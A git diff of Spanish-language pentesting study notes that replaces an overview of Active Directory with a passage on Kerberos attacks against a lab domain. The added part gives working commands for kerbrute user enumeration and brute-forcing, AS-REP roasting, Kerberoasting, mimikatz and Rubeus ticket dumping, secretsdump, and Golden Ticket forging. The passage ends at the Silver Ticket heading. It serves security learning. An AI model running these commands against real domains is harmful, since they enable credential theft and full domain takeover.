@@ -1,517 +1,441 @@
-# 📂 Active Directory
 
-> [!NOTE] 
-> Un Directorio Activo (Active Directory o AD) es una estructura jerárquica que permite centralizar la gestión de recursos, usuarios y servicios en una red empresarial. Esto nos evita tener que configurar individualmente decenas de equipos, lo que sería extremadamente lento, tedioso y propenso a errores.
+# 1. 🎟️ Ataques kerberos
 
-El AD se basa en un servidor llamado **DC (Controlador de Dominio)**, que se encarga de:
+> [!NOTE]
+> Los ataques contra Kerberos explotan debilidades en su diseño o mala configuración para **obtener tickets, crackearlos offline o falsificarlos** directamente. La mayoría no requieren tráfico adicional sospechoso porque abusa del propio protocolo.
 
-- Almacenar una base de datos llamada **Data Store** (o Directorio), que organiza de manera estructurada y jerárquica todos los recursos de la red (usuarios, sistemas, archivos, impresoras…)
-- Proporcionar una serie de servicios que permiten operar en este entorno, incluyendo funciones clave
+```
+[Qué tenemos]
+    └──────────┬─ Sin credenciales ───────────▶ AS-REP Roasting (usuarios sin preauth)
+               ├─ Con credenciales válidas ───▶ Kerberoasting (cuentas con SPN)
+               └─ Con un Hash ───────────┬────▶ Hash KRBTGT ──────────────▶ Golden Ticket
+                                         └────▶ Hash de cuenta con SPN ───▶ Silver Ticket
+```        
 
-| Puerto          | Servicio           | Descripción                                                                                                      |
-| --------------- | ------------------ | ---------------------------------------------------------------------------------------------------------------- |
-| **53**          | **DNS**            | Traduce nombres de equipos y dominios a direcciones IP y es fundamental para encontrar recursos en el directorio |
-| **88**          | **Kerberos**       | Protocolo principal de autenticación en AD, basado en tickets para acceder a servicios de la red                 |
-| **135**         | **MS-RPC**         | Facilita la comunicación entre distintos servicios de Windows y AD                                               |
-| **389**         | **LDAP**           | Protocolo utilizado para consultar y administrar objetos del dominio, como usuarios, grupos y equipos            |
-| **464**         | **kpasswd**        | Servicio de Kerberos para cambio y reseteo de contraseñas                                                        |
-| **636**         | **LDAPS**          | LDAP cifrado sobre TLS                                                                                           |
-| **3268 / 3269** | **Global Catalog** | Consultas al Catálogo Global (sin cifrar / con TLS)                                                              |
+El escenario es este:
 
-> [!NOTE] 
-> 🔁 No existe un solo DC sino varios, réplicas que comparten información a tiempo real para evitar perder el acceso a servicios si uno de ellos es atacado e inutilizado. El proceso de replicación se realiza de manera automática y se pueden gestionar como un solo DC.
+| Rol           | Hostname | FQDN           | IP          |
+| ------------- | -------- | -------------- | ----------- |
+| DC            | AD01     | AD01.dom.local | 10.10.10.10 |
+| Máquina unida | AD02     | AD02.dom.local | 10.10.10.11 |
 
 ---
-# 🗂️ 1. Organización del directorio
+## 1.1. 🔍 Enumeración y fuerza bruta con Kerbrute
+Con la herramienta kerbrute podemos obtener con kerberos información valiosa:
 
-El Directorio Activo se organiza de manera jerárquica.
+Para la enumeración de usuarios utilizamos 
+```
+kerbrute userenum -dc-ip 10.10.10.10 -d dom.local users.txt
+```
+- Podemos usar los usuarios que obtengamos de rpc, de una web, de algún archivo o de un diccionario como https://github.com/attackdebris/kerberos_enum_userlists
 
-## 1.1. Tipos de Objetos
-### 1.1.1 🧩 Objetos
-
-> [!NOTE] 
-> **Un objeto es cualquier elemento que existe dentro del directorio.** Por ejemplo, puede ser un usuario, un equipo, una impresora, un grupo o una carpeta compartida.
-
-**Cada objeto tiene una serie de atributos**, es decir, datos que lo describen. Esos atributos están definidos por el **Schema**, que actúa como una plantilla. Esto permite que todos los objetos de un mismo tipo tengan la misma estructura de atributos posibles, dándole cohesión al sistema.
-
-> _Por ejemplo, todos los objetos de tipo usuario disponen de atributos comunes como nombre, apellidos, correo electrónico o fecha de creación.
-
-**El Data Store se encarga de asegurar que todos los objetos cumplan las reglas de este Schema.**
-
-En el AD existen dos tipos principales de objetos:
-- **Los recursos**, que representan los elementos disponibles en la red (carpetas, equipos o impresoras)
-- **Las entidades o security objects**, que representan a quienes acceden a dichos recursos, como usuarios, roles y cuentas de servicio
+Para obtener la copia de `Kc.tgs` usamos este comando, para hacer fuerza bruta sobre un usuario. Luego rompemos este hash con john 
+```
+kerbrute bruteuser -dc-ip 10.10.10.10 -d dom.local diccionario.txt belen
+```
 
 ---
-### 1.1.2. 📂 Unidades Organizativas (OUs)
+## 1.2. AS-REP Roasting
 
-> [!NOTE] 
-> **Las Unidades Organizativas u OUs son contenedores que sirven para agrupar objetos relacionados.** Esto permite organizar mejor el directorio y administrar varios objetos de forma conjunta.
-
-Las OUs suelen crearse siguiendo la estructura de la empresa, por ejemplo: por departamentos, sedes o funciones. Gracias a estas OU se pueden aplicar permisos, tareas o directivas a varios objetos a la vez.
-
-> _Por ejemplo, se puede dar permiso al departamento de IT para restablecer contraseñas de los usuarios de la OU "RRHH" y "Oficina", pero no de otras OUs. Así se limita su alcance y se evita que tengan control sobre toda la empresa._
-
----
-### 1.1.3. 🌐 Dominio
-
-> [!NOTE] 
-> **Un dominio es una unidad independiente dentro del AD en la que se administran usuarios, equipos y recursos bajo unas mismas reglas de seguridad.**
-
-Dentro de un dominio, todos los objetos comparten las mismas políticas, la misma base de datos y un nombre común gestionado mediante DNS.
-
-El dominio se encarga de identificar a los usuarios (autenticación) y de decidir a qué recursos pueden acceder, funcionando como un entorno de administración centralizada y separado de otros dominios.
-
-> _Por ejemplo, pueden existir dominios como `BILBAO.L4H.LOCAL` y `FINANZAS.L4H.LOCAL`, cada uno con sus propios usuarios, recursos y políticas._
-
----
-### 1.1.4. 🌳 Bosque
-
-> [!NOTE] 
-El bosque es la estructura más grande de Active Directory. Sirve para unir varios dominios dentro de una misma organización. Estos dominios compartirán **el mismo schema, configuración y catálogo global.** Representa el límite máximo de seguridad y confianza, ya que todos los dominios dentro de un bosque confían entre sí de forma implícita, permitiendo la administración y el acceso a recursos de manera integrada.
-
-**Hay que pensar en el bosque como si fuera la empresa completa, y los dominios fueran sus distintas sedes o departamentos grandes.**
-
-> Tanto `BILBAO.L4H.LOCAL` como `FINANZAS.L4H.LOCAL` forman parte del mismo bosque: `L4H.LOCAL`
-
-Por último, aunque lo más habitual es que una empresa tenga un único bosque, en algunos casos se crean múltiples bosques para aislar ciertos sectores, como sucursales ubicadas en países con normativas específicas que exigen infraestructuras separadas.
-
----
-### 1.1.5. 📝 Catálogo Global (Global Catalog)
-
-> [!NOTE] 
-**El Catálogo Global (GC) es un índice parcial de todos los objetos de todos los dominios de un bosque**, alojado en determinados DCs (los "servidores de catálogo global").
-
-- Contiene **todos los objetos del bosque**, pero solo con un **subconjunto de sus atributos** (los más usados para búsquedas, como el nombre o el email), no el objeto completo.
-- Permite buscar objetos de **cualquier dominio del bosque sin tener que consultar uno a uno** cada DC de cada dominio.
-- Es imprescindible para el login con **UPN** (`usuario@dominio.local`) cuando el usuario y el equipo están en dominios distintos del mismo bosque, y también participa en la resolución de **membresías de grupos universales**.
-
-> _Piensa en el GC como el índice de una biblioteca gigante: no tiene el libro entero de cada dominio, pero sabe en qué "estantería" (dominio) está y algunos datos básicos de cada uno, para no tener que recorrerla entera._
-
----
-### 1.1.6. 🗺️ Sites (Sitios) y Subnets
-
-> [!NOTE] 
-**Un Site agrupa subredes (subnets) según su ubicación física o de red**, normalmente correspondiéndose con oficinas o centros de datos con buena conectividad interna.
-
-Sirven principalmente para dos cosas:
-
-- **Optimizar la autenticación**: un cliente intenta autenticarse contra el DC más cercano según su subred, evitando saltos innecesarios a través de enlaces lentos (WAN).
-- **Controlar la replicación**: dentro de un mismo site, la replicación entre DCs es frecuente e inmediata; entre sites distintos se usa un **Inter-Site Topology Generator (ISTG)** que programa la replicación en intervalos para no saturar los enlaces WAN.
-
-> _Por ejemplo, una empresa con sede en Bilbao y otra en Madrid puede definir un Site por ciudad. Un usuario que se conecta en Madrid se autenticará contra un DC de Madrid, no contra uno de Bilbao, aunque ambos pertenezcan al mismo dominio._
-
-
-----
-## 1.2. 🧩 Tipos de objetos
-
-Todo elemento dentro de Active Directory (AD) es un objeto, ya sea un recurso o una security entity.
-
-Cada objeto pertenece a una clase, la cual define un conjunto de atributos comunes según lo establecido en el schema. Por lo tanto, dos objetos de la misma clase comparten los mismos atributos, aunque sus valores puedan diferir.
-
-----
-### 1.2.1. 🌿 Leaf Objects
-
-Son objetos que no pueden contener otros objetos en su interior.
-
-| Nombre                     | Descripción                                                                                                            | Ejemplo                                     | ObjectClass              |
-| -------------------------- | ---------------------------------------------------------------------------------------------------------------------- | ------------------------------------------- | ------------------------ |
-| Usuario                    | Security Principal que representa a una persona o servicio. Tiene GUID y SID; algunos se usan como cuentas de servicio | juan.cuesta                                 | user                     |
-| Contacto                   | Representa usuarios externos, con menos atributos. No es Security Principal ni tiene SID                               | Contacto externo de un partner              | contact                  |
-| Foreign Security Principal | Representa usuarios de otros bosques añadidos a grupos del dominio actual, conservando su SID original                 | Usuario de otro dominio agregado a un grupo | foreignSecurityPrincipal |
-| Impresora                  | Recurso disponible en el AD. No es Security Principal; tiene GUID, pero no SID                                         | Impresora de red corporativa                | printQueue               |
-| Computadora                | Representa un equipo unido al dominio. Es Security Principal y tiene GUID y SID                                        | PC-01                                       | computer                 |
-
-----
-### 📦 1.2.2. ContainerObject
-**Pueden contener otros objetos, ya sean leaf objects u otros container objects.
-
-| Nombre   | Descripción                                                                                             | Ejemplo                           | ObjectClass        |
-| -------- | ------------------------------------------------------------------------------------------------------- | --------------------------------- | ------------------ |
-| Grupo    | Security Principal que agrupa usuarios y otros grupos (nested groups) para asignar permisos compartidos | Domain Admins                     | group              |
-| Built-in | Contenedor que almacena los grupos predeterminados creados automáticamente por AD                       | Builtin\Administrators            | container          |
-| Dominio  | Contenedor principal que alberga usuarios, computadoras, OUs y grupos, con reglas y políticas propias   | L4H.local                         | domainDNS          |
-| OU       | Contenedor lógico que agrupa objetos para facilitar la administración y aplicación de políticas         | OU=IT,  <br>DC=L4H,  <br>DC=local | organizationalUnit |
-
-----
-### 1.2.3. ⚫ Otros
-
-| Nombre             | Descripción                                                                                                      | Ejemplo                 | ObjectClass |
-| ------------------ | ---------------------------------------------------------------------------------------------------------------- | ----------------------- | ----------- |
-| Domain Controller  | Computadora que proporciona servicios de autenticación y autorización dentro del dominio                         | DC01.L4H.local          | computer    |
-| Carpeta compartida | Recurso compartido de una computadora, accesible según permisos definidos. Tiene GUID y no es Security Principal | \\FS01\Datos            | volume      |
-| Site               | Agrupa computadoras según su ubicación de red para optimizar la replicación entre controladores de dominio       | Default-First-Site-Name | site        |
-
-
----
-# 2. 🔍 LDAP y el DIT
-
-> [!TIP]
-El directorio es, en esencia, una base de datos que almacena y organiza todos estos objetos en una estructura jerárquica en forma de árbol, conocida como DIT (Directory Information Tree). Esta base de datos se accede y gestiona mediante un protocolo especializado llamado LDAP (Lightweight Directory Access Protocol), el cual permite consultar, compartir y administrar la información del directorio de forma eficiente.
-
-En terminología LDAP, todos los objetos del árbol se denominan entries. Cada entry pertenece a una clase ("objectClass"), que determina los atributos que puede contener (Ej: mail, uid, memberOf).
-
----
-## 2.1. Nomenclaturas
-
-Para poder identificar y localizar cada objeto dentro del árbol tenemos:
-
-| Nombre             | Servicio                                                                    | Descripción                                                                                                                                               |
-| ------------------ | --------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **RDN**            | Nombre relativo dentro de un contenedor                                     | **CN**: usuarios y computadoras `cn=Juan Perez`<br>**OU:** para las unidades organizativas. `ou=Usuarios`<br>**DC:** para el dominio. `dc=empresa,dc=com` |
-| **DN**             | Representa su ruta completa dentro del directorio,                          | `cn=Juan Perez,ou=Usuarios,dc=empresa,dc=com`                                                                                                             |
-| **FDQN**           | Es el nombre completo de un equipo dentro de la jerarquía del dominio (DNS) | `DC01.TXAPELATECH.LOCAL`                                                                                                                                  |
-| **GUID**           | Identificador único e inmutable de 128 bits                                 | `550e8400-e29b-41d4-a716-446655440000`                                                                                                                    |
-| **SID**            | Identificador único de cada security principal                              | `S-1-5-21-3623811015-3361044348-30300820-1107`                                                                                                            |
-| **SamAccountName** | nombre de inicio de sesión tradicional en entornos Windows                  | `TXAPELATECH\jsanabria`                                                                                                                                   |
-| UPN                | Otro identificador de inicio de sesión para el usuario                      | `jsanabria@txapelatech.local`                                                                                                                             |
-
----
-## 2.2. Sintaxis LDAP
-
-LDAP emplea **filtros LDAP** para las consultas, diseñados específicamente para trabajar buscando la posición de los objetos dentro del árbol DIT. Toda búsqueda LDAP se define a partir de tres elementos principales:
-
-1. **Base DN**: indica la ruta desde la que se inicia la búsqueda dentro del directorio
-2. **Filtro LDAP**: especifica las condiciones que deben cumplir los objetos para ser devueltos (por ejemplo, tipo de objeto o valor de un atributo)
-3. **Atributos a devolver**: qué datos concretos de cada entrada se quieren obtener como resultado de la búsqueda
-
-Las consultas LDAP siempre van entre paréntesis con la sintaxis: `(<clave>=<valor>)`.
-
-| Regla                     | Ejemplo       | Explicación del ejemplo                        |
-| ------------------------- | ------------- | ---------------------------------------------- |
-| **Igualdad**              | `(cn=jperez)` | Buscamos al usuario Juan Perez                 |
-| **Presencia de atributo** | `(mail=*)`    | Todos los objetos con el atributo mail relleno |
-| **Coincidencia parcial**  | `(cn=Juan*)`  | Todos los "Juanes"                             |
-Para consultas complejas, se combinan varias consultas simples concatenadas por un operador AND u OR
-
-| Regla   | Ejemplo                               | Explicación del ejemplo                             |
-| ------- | ------------------------------------- | --------------------------------------------------- |
-| **AND** | `(&(ou=contabilidad)(cn=Juan*))`      | Usuario que sea del ou contabilidad y se llame Juan |
-| **OR**  | `(\|(ou=contabilidad)(ou=direccion))` | Usuarios de dirección o contabilidad                |
-| **NOT** | `(!(cn=admin))`                       | Todos menos el admin                                |
-
-Las consultas LDAP se hacen con el comando `Get-ADObject`, que admite estos parámetros:
+> [!WARNING]
+> En Kerberos normal, el cliente debe cifrar un timestamp con su contraseña antes de recibir nada. Esto evita que un atacante pregunte por cualquier usuario sin consecuencias. Si la preautenticación está desactivada para un usuario (`DONT_REQ_PREAUTH`) el KDC responde al AS-REQ de cualquiera que conozca el nombre de usuario, **sin verificar que conoce la contraseña**.
 ```bash
-Get-ADObject
-  -LDAPFilter "(objectClass=user)"
-  -SearchBase "OU=IT,DC=empresa,DC=local"
-  -Properties samAccountName,mail,whenCreated
+Dominio.local 🡆 Users 🡆 Usuario 🡆 Account 🡆 Account Options 🡆 Do not requiere kerberos preauthentication
+```
+
+Recordemos que el AS-REP contiene dos partes:
+- El **TGT** → cifrado con la clave de KRBTGT, inútil para el atacante
+- La **copia de `Kc.tgs`** → cifrada con la clave derivada de la **contraseña del usuario**
+
+El atacante extrae esa segunda parte y la **crackea offline** para recuperar la contraseña.
+
+Para obtener la copia de `Kc.tgs` usamos este comando. Luego rompemos este hash con john 
+```bash
+Impacket-GetNPUsers dom.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt -format hashcat
 ```
 
 ---
-# 3. 🔁 Replicación
+## 1.2. Kerberoasting
 
-En el DC existe un archivo llamado **NTDS.dit**, que es la base de datos física de Active Directory. Dentro de él se almacenan varias particiones lógicas o _naming contexts_, entre ellas Domain, Configuration y Schema.
+> [!NOTE]
+> Cualquier usuario autenticado puede pedir un ST para cualquier servicio del dominio. El ST está cifrado con la clave de la cuenta asociada al SPN. El KDC no comprueba si el usuario tiene permiso para usar ese servicio, solo emite el ticket.
 
-- 🌐 **Domain**: contiene los objetos del dominio, como usuarios, grupos, equipos, impresoras, unidades organizativas (OUs), etc. y sus atributos. Parte de esos atributos son especialmente sensibles, como los hashes NTLM de los usuarios.
-- 🛠️ **Configuration**: almacena información sobre la estructura del bosque, los dominios, los sitios y los servicios.
-- 🧾 **Schema**: define qué tipos de objetos existen en Active Directory y qué atributos puede tener cada uno.
+El atacante solicita el ST legítimamente y lo **crackea offline** para recuperar la contraseña de la cuenta de servicio.
 
 > [!WARNING]
-En una empresa normalmente no existe un único DC, sino varios. Todos ellos mantienen copias de estas particiones y deben permanecer sincronizados, sin discrepancias entre sí. Si cambia cualquier dato en un controlador de dominio, el resto debe recibir ese cambio para que la información sea coherente en todo el entorno. Esto es fundamental para evitar problemas de autenticación, autorización y acceso a recursos.
-
-> _Por ejemplo, un usuario debe existir con la misma contraseña, pertenencia a grupos y resto de atributos en todos los controladores de dominio, de modo que pueda autenticarse correctamente desde cualquier sede o servicio de la organización._
-
-Para evitar discrepancias, los DCs se sincronizan entre sí mediante un proceso llamado **replicación**. En lugar de copiar toda la base de datos cada vez, solo se replican los cambios realizados en una partición concreta, lo que reduce el tráfico y hace el proceso más eficiente. 
-
-Esta replicación se realiza mediante el protocolo remoto de replicación de Active Directory, conocido como **Directory Replication Service Remote Protocol (MS-DRSR)**.
-
-En este contexto entran en juego una serie de privilegios especiales de replicación:
-
-- **Replicating Directory Changes (Get Changes)**: permite solicitar los cambios de una partición. De forma simplificada, equivale a decir: _"déjame ver qué ha cambiado"_.
-- **Replicating Directory Changes All (Get Changes All)**: es el privilegio más sensible, ya que permite replicar también **datos secretos del dominio** (los hashes NTLM de los usuarios en la partición Domain). De forma simplificada, equivale a: _"déjame ver también la parte sensible, no solo lo básico"_.
-
-> [!CAUTION]
-> Estos privilegios suelen estar disponibles para cuentas altamente privilegiadas, como las de Domain Admins, o para ciertos servicios legítimos de sincronización. El problema aparece cuando una cuenta con estos derechos es comprometida, o cuando dichos permisos se delegan a usuarios o grupos que no deberían tenerlos.
-
-## 4. Roles y trusts
-
-## 4.1. 👑 Roles FSMO (Flexible Single Master Operations)
-
-> [!NOTE]
-Aunque AD es una base de datos **multi-maestro** (cualquier DC admite escrituras y las replica al resto), existen **5 operaciones que no pueden hacerse de forma distribuida** sin generar conflictos. Para esas operaciones, un único DC del bosque o dominio actúa como "dueño" en cada momento.
-
-| Rol                       | Alcance                 | Función                                                                                                                                                          |
-| ------------------------- | ----------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| **Schema Master**         | Bosque (1 por bosque)   | Único DC que puede modificar el Schema (añadir/cambiar tipos de objeto o atributos)                                                                              |
-| **Domain Naming Master**  | Bosque (1 por bosque)   | Controla la adición y eliminación de dominios dentro del bosque                                                                                                  |
-| **RID Master**            | Dominio (1 por dominio) | Reparte bloques de RIDs (identificadores relativos) a cada DC, con los que se construyen los SID de los nuevos objetos                                           |
-| **PDC Emulator**          | Dominio (1 por dominio) | Actúa como reloj maestro de tiempo, procesa cambios de contraseña urgentes y bloqueos de cuenta, y es el objetivo preferente de las Group Policies más recientes |
-| **Infrastructure Master** | Dominio (1 por dominio) | Mantiene actualizadas las referencias a objetos de otros dominios (por ejemplo, miembros de grupos que pertenecen a otro dominio del bosque)                     |
-
-> Si un DC con un rol FSMO se cae, esa operación concreta queda bloqueada hasta que se transfiera (o se fuerce mediante _seize_) el rol a otro DC; el resto del directorio sigue funcionando con normalidad gracias al modelo multi-maestro.
-
----
-## 4.2. 🤝 Confianzas (Trusts)
-
-> [!NOTE]
-**Una confianza (trust) es una relación que permite a los usuarios de un dominio o bosque autenticarse y acceder a recursos de otro dominio o bosque**, sin necesidad de tener una cuenta duplicada en cada uno.
-
-Se definen por dos características:
-
-- **Dirección**: unidireccional (A confía en B, pero no al revés) o bidireccional (ambos confían entre sí)
-- **Transitividad**: transitiva (la confianza se extiende a otros dominios/bosques que confíen en el segundo) o no transitiva (solo aplica entre los dos extremos definidos)
-
-|Tipo|Descripción|
-|---|---|
-|**Parent-Child**|Automática y transitiva, entre un dominio y los que cuelgan de él dentro del mismo bosque|
-|**Tree-Root**|Automática y transitiva, entre el dominio raíz del bosque y un nuevo árbol de dominio añadido al mismo bosque|
-|**Shortcut**|Manual, para optimizar la autenticación entre dos dominios muy alejados dentro del mismo bosque, evitando recorrer toda la jerarquía|
-|**Forest Trust**|Manual, transitiva dentro de cada bosque, conecta dos bosques completos entre sí|
-|**External Trust**|Manual, no transitiva, conecta un dominio concreto con otro dominio de un bosque distinto (sin extenderse al resto del bosque)|
-|**Realm Trust**|Conecta un dominio de AD con un entorno Kerberos no-Windows (por ejemplo, un KDC de MIT Kerberos en Linux)|
-
-> _Por ejemplo, si `FINANZAS.L4H.LOCAL` tiene una External Trust con el dominio `PARTNER.LOCAL`, solo los usuarios de `PARTNER.LOCAL` (y no los de todo su bosque) podrán acceder a recursos autorizados de `FINANZAS.L4H.LOCAL`._
-
----
-## 4.3. 📜 Group Policy Objects (GPO)
-
-> [!NOTE]
-**Las GPOs son el mecanismo de AD para aplicar configuración de forma centralizada** a usuarios y equipos: políticas de contraseñas, restricciones de software, scripts de inicio/cierre de sesión, configuración de seguridad, mapeo de unidades, etc.
-
-- Se almacenan en dos partes: los metadatos en el **Data Store** (contenedor `groupPolicyContainer`) y los archivos de configuración en **SYSVOL** (`\\dominio\SYSVOL\dominio\Policies\{GUID}`), una carpeta compartida que se replica entre todos los DCs.
-- Se **vinculan** (link) a un Sitio, Dominio u OU, y se aplican a todos los objetos contenidos en ese nivel.
-- Siguen un orden de aplicación conocido como **LSDOU**: Local → Site → Domain → OU (de más general a más específico), donde la configuración más específica prevalece salvo que se marque **Enforced** (obligatoria, no se puede sobrescribir) o el contenedor tenga **Block Inheritance** (bloquea las políticas heredadas de niveles superiores).
-
-> _Por ejemplo, una GPO vinculada al dominio puede forzar una política de contraseñas mínima para todos, mientras que una GPO vinculada a la OU "IT" añade software adicional solo para ese departamento._
-
----
-
-## 🛡️ 4.4. Autorización
-
-Cada objeto de AD tiene un **Security Descriptor**, una estructura que define quién puede hacer qué sobre él. Contiene, entre otras cosas:
-- **Owner (propietario)**: el SID del propietario del objeto, que siempre puede modificar sus permisos
-- **DACL (Discretionary ACL)**: la lista que define **qué usuarios o grupos tienen qué permisos** sobre el objeto (lectura, escritura, borrado, etc.) Estña compuesta por  **ACEs (Access Control Entries)**, cada una indicando un SID y el permiso que se le concede o deniega. 
-- **SACL (System ACL)**: define qué acciones sobre el objeto se **auditan** (quedan registradas en el log de seguridad)
-
-Algunos de los permisos más relevantes en AD:
-
-|Permiso|Qué permite|
-|---|---|
-|`GenericAll`|Control total sobre el objeto (equivalente a ser su dueño)|
-|`GenericWrite`|Modificar la mayoría de atributos del objeto|
-|`WriteOwner`|Cambiar el propietario del objeto (y desde ahí, tomar control total)|
-|`WriteDACL`|Modificar los permisos del propio objeto|
-|`ForceChangePassword`|Cambiar la contraseña de un usuario sin conocer la actual|
-|`AllExtendedRights`|Ejecutar todas las "acciones extendidas", incluyendo cambiar contraseñas o (si aplica) leer atributos confidenciales|
-
-> *Estos son precisamente los privilegios que aparecen en la tabla de "Grupos con privilegios elevados": no son mágicos, son ACEs concretas dentro de una DACL, iguales a las que un administrador podría delegar por error sobre cualquier objeto normal.*
-
-> [!TIP]
-🛡️ Existe además un mecanismo de protección especial llamado **AdminSDHolder**: es una plantilla de permisos que se aplica periódicamente (cada 60 min aprox., vía el proceso SDProp) a los miembros de grupos altamente privilegiados (Domain Admins, Enterprise Admins, etc.), sobrescribiendo cualquier permiso personalizado que se les hubiera añadido, para evitar que alguien delegue silenciosamente control sobre una cuenta protegida.
-
-
----
-# 5. 👥 Grupos y privilegios
-
-Recordamos que tenemos una serie de grupos de administración con privilegios clave. Si se compromete una cuenta que forme parte de estos grupos, tanto directa como indirectamente, podremos realizar una escalada de privilegios.
-
-Puede que nuestro usuario, por medio de un permiso especial, pueda obtener el control de la cuenta de otro usuario con mayor nivel de acceso en la red.
-
-## 5.1. Tipos de grupos
-
-Existen dos tipos principales de grupos en Active Directory:
-
-- ⚠️ **Security Groups**: se utilizan para agrupar usuarios (u otros objetos) con los mismos permisos y así facilitar la administración. Los usuarios heredan los privilegios de los grupos a los que pertenecen.
-- 📩 **Distribution Groups**: se emplean únicamente para la distribución de correos electrónicos y facilitar el envío de mensajes masivos. No otorgan privilegios ni se usan para control de acceso.
-
-Además del tipo, los grupos pueden clasificarse según su alcance, definido mediante un atributo específico:
-
-|Grupo|Descripción|
-|---|---|
-|**Domain Local Groups**|Tienen alcance a nivel de dominio. Pueden contener usuarios de otros dominios, pero solo pueden otorgar permisos sobre recursos del dominio donde existen|
-|**Global Groups**|Pueden otorgar acceso a recursos de otros dominios, pero solo pueden contener usuarios del dominio en el que fueron creados|
-|**Universal Groups**|Pueden contener usuarios de cualquier dominio del forest y otorgar acceso a recursos en todo el forest|
-
-## 5.2. Grupos con privilegios elevados
-
-> [!WARNING]
-Existen grupos especiales en Active Directory a los que se les asignan privilegios elevados por defecto. Por este motivo, hay que añadir muy pocos usuarios a estos grupos y que además contengan credenciales muy robustas, para evitar riesgos de seguridad y vectores de ataque.
-
-| Grupo                           | Descripción                                                                                                                                                                                             | Privilegio                             |
-| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
-| **Domain Admins**               | Pueden realizar tareas administrativas vía UAC                                                                                                                                                          | `GenericAll`                           |
-| **Enterprise Admins**           | Privilegios de administración a nivel de bosque                                                                                                                                                         | `GenericAll`                           |
-| **Account Operators**           | Pueden gestionar cuentas de usuario y grupos, aunque con restricciones sobre grupos altamente privilegiados como Domain Admins o Administrators                                                         | `ForceChangePassword` / `GenericWrite` |
-| **Backup Operators**            | Pueden realizar copias de seguridad y restauración de archivos del sistema                                                                                                                              | `SeBackupPrivilege`                    |
-| **Server Operators**            | Tienen capacidad para administrar servidores del dominio. Pueden iniciar y detener servicios, administrar recursos compartidos y, en algunos casos, lograr ejecución de código con privilegios elevados | —                                      |
-| **Print Operators**             | Administran los servicios de impresión del dominio                                                                                                                                                      | `SeLoadDriverPrivilege`                |
-| **DnsAdmins**                   | Administran el servicio DNS integrado en Active Directory. Pueden cargar DLLs como plugins de DNS                                                                                                       | —                                      |
-| **Group Policy Creator Owners** | Pueden crear nuevas políticas de grupo                                                                                                                                                                  | —                                      |
-| **Schema Admins**               | Tienen permisos para modificar el esquema de Active Directory                                                                                                                                           | —                                      |
-| **Cert Publishers**             | Participan en la publicación de certificados dentro de Active Directory                                                                                                                                 | —                                      |
-| **SQL Server Admins**           | Suele ser un grupo personalizado en entornos con Microsoft SQL Server. Sus miembros pueden tener privilegios administrativos sobre servidores SQL                                                       | —                                      |
-> [!CAUTION]
-> Estos son grupos anidados. Si un grupo pertenece a otro, sus miembros heredarán todos los permisos y privilegios que tenga el grupo madre.
+ Para el ataque, hay que asignarle un SPN a un usuario normal, eso hace que Kerberos lo trate como una cuenta de servicio aunque el SPN no exista. Si su contraseña es débil, el atacante podrá obtenerla a partir del ST
 > 
-> _Pedro tiene la contraseña "password123" y pertenece al grupo Account Operators. Para "arreglarlo", sacan a Pedro de ese grupo, por lo que solo pertenece al grupo IT. El problema es que se añadió este grupo a Account Operators en el pasado. Resultado: Pedro sigue teniendo los mismos privilegios, solo que ahora nadie se da cuenta a simple vista._
+> Para asignarle un SPN a un usuario es con `setspn -A test/spn usuario` luego podemos listarlo con `setspn -L usuario`
+
+ Obtener el ST de usuarios con SPN y crackearlo
+```bash
+impacket-GetUserSPNs dom.local/belen:pass123 -request
+```
+
+Por eso, los servicios deben estar gestionados por **Managed Service Accounts (MSA/gMSA)**, lo que le da contraseñas aleatorias de 120 caracteres, incrackeables en la práctica. También se recomienda auditar regularmente los SPNs asignados.
 
 ---
+## 1.3. Ataques de creación de tickets
 
-# 6. 🔐 Qué es Kerberos
+> [!CAUTION]
+> En Windows, los tickets son procesados y almacenados por el proceso LSASS. Si el atacante tiene acceso a la memoria de una máquina donde hay una sesión activa, puede extraer los tickets e **inyectarlos en su propia sesión** para suplantar al usuario. Como usuario no administrativo, solo puedes obtener tus propios tickets, pero como administrador local, puedes recolectar todo.
+
+Podemos exportar los tickets de varias maneras
+```bash
+.\mimikatz.exe 'sekurlsa::tickets /export' exit
+Rubeus.exe dump /nowrap
+```
+
+Los tickets `.kirbi` pueden pertenecer a:
+- La cuenta de la computadora, para poder interactuar con el AD.
+- Los tickets de usuario, en formato `<valor_aleatorio>-<usuario>@<servicio>-<dominio>.kirbi.` Si en el servicio pone `krbtgt` , corresponde al TGT de esa cuenta.
+
+Si obtenemos un TGT del administrador podemos usar secretsdump con linx para volcar la SAM sin tener que conocer su contraseña:
+```bash
+# Desde linux
+export KRB5CCNAME=/tmp/dc.ccache
+impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 \
+	-just-dc-user Administrator 'DOM.LOCAL/AD01$'@AD01.DOM.LOCAL
+```
+
+
+### 1.3.1. Golden Ticket
+El TGT está cifrado con la clave de KRBTGT. El KDC confía ciegamente en cualquier TGT que pueda descifrar con esa clave. Si el atacante tiene esa clave, puede **fabricar TGTs válidos** para pedir **STs** en nombre de cualquier usuario para cualquier servicio, incluyendo administradores o usuarios inexistentes. 
+
+> [!WARNING]
+Por tanto esta vía suele darse en postexplotación como vía de persistencia. Este ataque da **acceso potencial a todo el dominio**, siendo el ticket mas valioso que existe en un AD. Los Golden Tickets **persisten incluso si se cambia la contraseña del usuario suplantado**, porque el KDC no verifica que el usuario exista, solo que el TGT sea válido
+
+Para el ataque, necesitamos haber dumpeado el **Hash NTLM de la cuenta KRBTGT** (obtenible por ejemplo mediante **DCSync**).
+
+```bash
+# Ataque desde Windows con Mimikatz
+# - Podemos cambiar el cifrado a /aes256:hash o /aes128:hash
+# - Nowrap permite copiar mejor el ticket en base64
+.\mimikatz.exe 'kerberos::golden /user:Administrator /domain:dom.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /ptt /nowrap' exit
+
+# Ataque desde Windows con Rubeus
+.\Rubeus.exe golden /rc4:<krbtgtNThash> /domain:dominio.local /sid:<domainSID> /user:Administrator /ptt /ldap /nowrap
+
+# Ataque desde Linux
+impacket-ticketer.py -nthash <krbtgtNThash> -domain-sid <domainSID> -domain domain.local Administrator
+```
+
+----------
+### 1.3.2. Silver Ticket
+> [!NOTE]
